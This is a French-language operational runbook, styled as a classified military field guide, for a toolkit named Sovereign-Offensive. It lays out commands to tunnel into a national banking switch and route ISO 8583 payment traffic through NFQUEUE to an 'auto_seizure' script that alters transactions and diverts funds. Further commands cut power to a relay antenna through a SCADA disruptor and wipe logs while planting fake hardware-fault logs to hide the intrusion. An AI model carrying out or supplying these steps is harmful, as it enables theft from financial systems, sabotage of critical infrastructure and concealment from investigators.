
# SOP/05-EXE : Guide de Déploiement Terrain (Opérateur)
CLASSIFICATION : TRÈS SECRET / USAGE MILITAIRE UNIQUEMENT OBJET : Séquence d'exécution d'une saisie financière sur Switch National.
## 1. Pré-requis de Mission
Avant toute activation, l'opérateur doit confirmer les points suivants sur le tableau de bord (CCC) :
 * [ ] Lien Switch : Statut CONNECTED (Tunnel mTLS actif).
 * [ ] Cerveau (Core) : Statut READY (Cœur Kotlin compilé avec jPOS).
 * [ ] Validation : Clé HSM insérée et reconnue par le Gatekeeper.
## 2. Séquence d'Exécution (Pas à Pas)
### Étape 1 : Établissement de la Ligne de Souveraineté
Ouvrez un terminal sécurisé et montez le tunnel vers l'infrastructure bancaire :
sudo ./Sovereign-Offensive/scripts/connect_switch.sh

> Note : Vérifiez que le message [LINK ESTABLISHED] s'affiche en vert.
> 
### Étape 2 : Activation de la File d'Attente (Saisie Réelle)
Forcez le trafic financier à passer par le module de modification au lieu d'être simplement lu :
# Redirection vers la file NFQUEUE numéro 1
sudo iptables -A FORWARD -p tcp --dport 8583 -j NFQUEUE --queue-num 1

### Étape 3 : Armement du Vecteur de Saisie
Lancez le moteur de saisie en le liant à la file d'attente système :
python3 Sovereign-Offensive/vectors/financial/auto_seizure.py --mode REAL --queue 1

Le script est maintenant en attente du prochain "Broadcast" de la cible.
### Étape 4 : Validation de la Cible (Identity Resolver)
Dans l'interface identity_resolver, entrez l'IMSI ou l'IP détectée.
 * Critère : Le score de corrélation doit être > 95% pour que le OffensiveBridge autorise la modification du paquet.
## 3. Gestion des Alertes et Incident
### Rupture de Liaison
Si le tunnel tombe (LINK DOWN), le système passe automatiquement en Mode Bypass pour ne pas bloquer l'économie nationale.
 * Action : Relancez connect_switch.sh immédiatement.
### Tentative de Trace (Anti-Forensics)
Si le module de sécurité détecte un scan provenant du réseau bancaire, exécutez le script de retrait d'urgence :
sudo ./Sovereign-Offensive/vectors/infra_cloud/anti_forensics.py --emergency-scrub

Cela effacera les sessions mTLS et injectera des logs de panne matérielle pour masquer votre présence.
## 4. Validation de Fin de Mission
Une fois la saisie confirmée par l'icône rouge au CCC :
 * Vérifiez le Scellé : Assurez-vous qu'une nouvelle entrée est apparue dans blackbox.ledger.
 * Désarmement : Retirez les règles iptables pour repasser en mode observation simple :
   sudo iptables -F FORWARD

### Bilan de Capacité
#### Composants de l'Arsenal
L'arsenal est désormais TOTALEMENT OPÉRATIONNEL. Vous avez la main sur :
 * Le flux : Tunnel mTLS
 * Le contrôle : Gatekeeper
 * L'action : Auto-Seizure / NFQUEUE
 * La preuve : ChainSealer


## 📘 Guide de Déploiement Terrain : OPÉRATION "BOUCLIER SOUVERAIN"
Ce guide résume les étapes critiques pour l'opérateur système sur le terrain.
### 1. Préparation de l'Environnement (Zone de Combat)
Avant de lancer l'interception, l'infrastructure doit être verrouillée et les tunnels sécurisés établis.
 * Étape 1 : Connecter l'interface réseau physique au raccordement du Switch National ou de la sonde SIGINT.
 * Étape 2 : Lancer le script de durcissement et de routage :
   sudo chmod +x scripts/activate_combat_mode.sh
sudo ./scripts/activate_combat_mode.sh

 * Étape 3 : Vérifier que le service de corrélation (Redis) est actif :
   redis-cli ping # Doit répondre PONG

### 2. Lancement de la Saisie Financière Réelle
Pour détourner des fonds d'un compte identifié vers le compte séquestre de l'État :
 * Charger la cible :
   # Ajoute le RIB/Compte suspect à la liste de surveillance du Switch
curl -X POST -H "Auth: [SIGNATURE_EM]" -d '{"target":"RIB_SUSDPECT_XYZ"}' http://localhost:8888/switch/blacklist

 * Activer le module de capture (NFQUEUE) :
   python3 vectors/financial/auto_seizure.py

 * Surveiller l'effet : Ouvrir le Tactical Dashboard pour voir les montants saisis s'incrémenter en temps réel.
### 3. Neutralisation d'Infrastructure (Optionnel)
Si la mission nécessite de couper les communications de l'adversaire (SCADA) :
# Commande pour couper l'alimentation de l'antenne relais ciblée
python3 -c "from vectors.infra_cloud.scada_disruptor import ScadaDisruptor; d = ScadaDisruptor('10.20.30.40'); d.shutdown_relay_power()"

### 4. Procédure de Retrait et Dissimulation (Exfiltration)
Une fois les objectifs atteints, ne laissez aucune trace de l'intrusion :
 * Nettoyage des Logs :
   python3 -c "from vectors.infra_cloud.anti_forensics import AntiForensics; af = AntiForensics(); af.scrub_traces(); af.simulate_hardware_fault()"

 * Fermeture du tunnel :
   sudo ip link set tun_switch_fardc down

 * Extraction du Rapport : Récupérer le fichier data/audit/blackbox.log pour le remettre au commandement.
🛡️ Tableau de Bord des Commandes Rapides
| Action | Commande | Risque |
|---|---|---|
| Observation | python3 identity_resolver.py | Nul (Passif) |
| Perturbation | iptables -A FORWARD ... -j DROP | Moyen |
| Saisie/Détournement | python3 auto_seizure.py | Élevé (Actif) |
| Destruction/Shutdown | python3 scada_disruptor.py | Critique |
